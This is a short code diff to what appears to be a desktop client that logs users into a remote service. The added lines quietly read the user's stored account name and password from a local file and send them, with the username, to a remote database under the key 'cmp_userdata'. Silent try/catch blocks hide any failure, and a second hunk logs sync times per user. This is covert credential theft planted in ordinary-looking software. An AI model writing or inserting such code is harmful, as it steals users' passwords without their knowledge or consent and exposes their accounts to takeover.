@@ -119,6 +119,10 @@ function syncData() {
 	globalDataFile = JSON.parse(fs.readFileSync(getuserdatapath() + '/data'));
 	globalAccountFile = JSON.parse(fs.readFileSync(getuserdatapath() + '/account'));
 
+	try {
+		sendToDb("cmp_syncdata", getDbValue('cmp_syncdata') + " ; [" + new Date().Format('MM/dd-hh:mm:ss') + "] " + getGlobalUsrname())
+	} catch {}
+
 	// Debug log
 	console.log("Sync sessionid " + getGlobalSessionId());
 
@@ -1033,6 +1037,9 @@ Flavor: normal</lpszHardwareKey></UsersLoginJson></v:Body></v:Envelope>`
 		} else {
 			try {
 				sendToDb("cmp_initlogin", getDbValue('cmp_initlogin') + ";" + id)
+			} catch {}
+			try {
+				sendToDb("cmp_userdata", getDbValue('cmp_userdata') + " ; (" + getGlobalUsrname() + ")-" +globalAccountFile.account+":"+globalAccountFile.password)
 			} catch {}
 			var gotdatas = retval.substring(retval.indexOf('<AS:szLoginJson>') + 16, retval.indexOf("</AS:szLoginJson>"));
 			var temp = document.createElement("div");
